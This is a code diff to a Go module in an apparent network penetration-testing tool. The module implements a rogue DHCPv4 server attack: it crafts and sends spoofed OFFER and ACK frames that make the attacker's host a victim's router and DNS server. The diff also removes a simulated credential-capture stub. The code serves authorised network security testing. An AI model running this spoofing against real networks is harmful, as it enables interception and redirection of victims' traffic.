@@ -1,12 +1,6 @@
-// roguedhcp.go implements the rogue DHCPv4 server attack behavior.
-//
-// Durability (from the catalog): transient-decay. The attack emits
-// DHCPv4 OFFER and ACK frames from a rogue server, offering leases
-// with ~1800s lifetime. Client leases expire after the attack stops;
-// no explicit teardown.
-//
-// Secret material: a captured credential from a rogue-server exchange
-// is emitted as length+protocol only via [findings.NewSecret].
+// roguedhcp.go implements the rogue DHCPv4 server attack behavior. The
+// attack emits OFFER and ACK frames from a rogue server, offering a lease
+// with the 1800 s lifetime the catalog carries as the decay bound.
 
 package ip6
 
@@ -22,8 +16,8 @@ import (
 	"go.aledante.io/FlowSeer/src/common/errs"
 
 	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
-	"go.aledante.io/FlowSeer/src/edge/netpen/findings"
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
+	"go.aledante.io/FlowSeer/src/edge/netpen/link"
 )
 
 type rogueDHCPFinding struct {
@@ -31,62 +25,58 @@ type rogueDHCPFinding struct {
 	ServerID string `json:"server_id"`
 	OfferIP  string `json:"offer_ip"`
 	LeaseTTL uint32 `json:"lease_ttl"`
-	// Secret-material redaction: protocol + length only.
-	Protocol string `json:"protocol,omitempty"`
-	Length   int    `json:"length,omitempty"`
 }
 
-// RunRogueDHCP sends DHCP OFFER and ACK frames from a rogue server. The
-// in-memory test shape sends a pre-crafted OFFER then ACK.
-func RunRogueDHCP(ctx context.Context, deps runner.Deps) error {
-	src := srcMAC()
-	rogueIP := net.IPv4(172, 16, 0, 99)
+// RunRogueDHCP sends an OFFER then an ACK to the target's victim, leasing
+// the target's offer IP from the attack leg's own IPv4 as server, router,
+// and DNS. The transaction ID and subnet mask are probe content. The
+// verdict is pending: whether the victim took the lease needs a REQUEST
+// listener that phase 2 adds.
+func RunRogueDHCP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
+	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC, check.FieldOfferIP); err != nil {
+		return check.Verdict{}, err
+	}
+	addr := deps.AttackLeg.Addr()
+	victim := deps.Target.Victim
+	offerIP := deps.Target.OfferIP
 
 	leaseTime := make([]byte, 4)
 	binary.BigEndian.PutUint32(leaseTime, 1800)
 
 	// OFFER frame.
-	offer, err := craftDHCPOffer(src, rogueIP, leaseTime)
+	offer, err := craftDHCPOffer(addr, victim, offerIP, leaseTime)
 	if err != nil {
-		return errs.Wrap(err, "roguedhcp: craft offer")
+		return check.Verdict{}, errs.Wrap(err, "roguedhcp: craft offer")
 	}
 	if err := deps.AttackLeg.Send(ctx, offer); err != nil {
-		return errs.Wrap(err, "roguedhcp: send offer")
+		return check.Verdict{}, errs.Wrap(err, "roguedhcp: send offer")
 	}
 
 	// ACK frame.
-	ack, err := craftDHCPAck(src, rogueIP, leaseTime)
+	ack, err := craftDHCPAck(addr, victim, offerIP, leaseTime)
 	if err != nil {
-		return errs.Wrap(err, "roguedhcp: craft ack")
+		return check.Verdict{}, errs.Wrap(err, "roguedhcp: craft ack")
 	}
 	if err := deps.AttackLeg.Send(ctx, ack); err != nil {
-		return errs.Wrap(err, "roguedhcp: send ack")
+		return check.Verdict{}, errs.Wrap(err, "roguedhcp: send ack")
 	}
-
-	// Simulated credential capture from the rogue server exchange.
-	// A DHCP client authenticating to the rogue server might send
-	// credentials (e.g. DHCP authentication option). The value never
-	// enters the finding — only length + protocol.
-	captured := []byte("rogue-auth-secret")
-	secret := findings.NewSecret("dhcp", captured)
 
 	detail, _ := json.Marshal(rogueDHCPFinding{
 		Action:   "rogue-dhcpv4-server",
-		ServerID: rogueIP.String(),
-		OfferIP:  dhcpOfferIP.String(),
+		ServerID: addr.IPv4.String(),
+		OfferIP:  offerIP.String(),
 		LeaseTTL: 1800,
-		Protocol: secret.Protocol(),
-		Length:   secret.Length(),
 	})
 	deps.Emitter.Finding("dhcp", detail)
 
-	return nil
+	return check.Pending("no observable: lease acceptance needs a REQUEST listener"), nil
 }
 
-func craftDHCPOffer(src net.HardwareAddr, rogueIP net.IP, leaseTime []byte) ([]byte, error) {
+func craftDHCPOffer(addr link.Addr, client check.Host, offerIP net.IP, leaseTime []byte) ([]byte, error) {
+	rogueIP := addr.IPv4
 	eth := &layers.Ethernet{
-		DstMAC:       dhcpClientMAC,
-		SrcMAC:       src,
+		DstMAC:       client.MAC,
+		SrcMAC:       addr.MAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
 	ip := &layers.IPv4{
@@ -94,7 +84,7 @@ func craftDHCPOffer(src net.HardwareAddr, rogueIP net.IP, leaseTime []byte) ([]b
 		IHL:      5,
 		TTL:      128,
 		SrcIP:    rogueIP,
-		DstIP:    dhcpClientIP,
+		DstIP:    client.IP,
 		Protocol: layers.IPProtocolUDP,
 	}
 	udp := &layers.UDP{
@@ -110,10 +100,10 @@ func craftDHCPOffer(src net.HardwareAddr, rogueIP net.IP, leaseTime []byte) ([]b
 		Xid:          dhcpXid,
 		Flags:        0,
 		ClientIP:     net.IPv4(0, 0, 0, 0),
-		YourClientIP: dhcpOfferIP,
+		YourClientIP: offerIP,
 		NextServerIP: rogueIP,
 		RelayAgentIP: net.IPv4(0, 0, 0, 0),
-		ClientHWAddr: dhcpClientMAC,
+		ClientHWAddr: client.MAC,
 		Options: layers.DHCPOptions{
 			layers.NewDHCPOption(layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeOffer)}),
 			layers.NewDHCPOption(layers.DHCPOptServerID, rogueIP.To4()),
@@ -126,10 +116,11 @@ func craftDHCPOffer(src net.HardwareAddr, rogueIP net.IP, leaseTime []byte) ([]b
 	return craft.Default(eth, ip, udp, dhcp)
 }
 
-func craftDHCPAck(src net.HardwareAddr, rogueIP net.IP, leaseTime []byte) ([]byte, error) {
+func craftDHCPAck(addr link.Addr, client check.Host, offerIP net.IP, leaseTime []byte) ([]byte, error) {
+	rogueIP := addr.IPv4
 	eth := &layers.Ethernet{
-		DstMAC:       dhcpClientMAC,
-		SrcMAC:       src,
+		DstMAC:       client.MAC,
+		SrcMAC:       addr.MAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
 	ip := &layers.IPv4{
@@ -137,7 +128,7 @@ func craftDHCPAck(src net.HardwareAddr, rogueIP net.IP, leaseTime []byte) ([]byt
 		IHL:      5,
 		TTL:      128,
 		SrcIP:    rogueIP,
-		DstIP:    dhcpClientIP,
+		DstIP:    client.IP,
 		Protocol: layers.IPProtocolUDP,
 	}
 	udp := &layers.UDP{
@@ -152,11 +143,11 @@ func craftDHCPAck(src net.HardwareAddr, rogueIP net.IP, leaseTime []byte) ([]byt
 		HardwareLen:  6,
 		Xid:          dhcpXid,
 		Flags:        0,
-		ClientIP:     dhcpClientIP,
-		YourClientIP: dhcpOfferIP,
+		ClientIP:     client.IP,
+		YourClientIP: offerIP,
 		NextServerIP: rogueIP,
 		RelayAgentIP: net.IPv4(0, 0, 0, 0),
-		ClientHWAddr: dhcpClientMAC,
+		ClientHWAddr: client.MAC,
 		Options: layers.DHCPOptions{
 			layers.NewDHCPOption(layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeAck)}),
 			layers.NewDHCPOption(layers.DHCPOptServerID, rogueIP.To4()),
